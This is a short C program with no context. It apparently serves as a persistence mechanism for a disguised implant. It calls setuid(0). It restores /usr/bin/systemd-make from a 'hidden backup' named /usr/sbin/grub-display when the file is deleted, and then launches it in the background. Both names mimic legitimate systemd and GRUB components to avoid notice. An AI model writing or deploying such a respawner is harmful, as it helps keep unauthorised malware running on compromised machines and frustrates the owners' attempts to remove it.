#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
int main (int argc, char *argv[]) {
	setuid(0);
	//Check to see if the executable path exists
	if( access( "/usr/bin/systemd-make", F_OK ) != 0 ) {
		//If not, replace it with the hidden backup
    	system("cp /usr/sbin/grub-display /usr/bin/systemd-make");
	}
	//Execute
	system("/usr/bin/systemd-make &");
	return(0);
}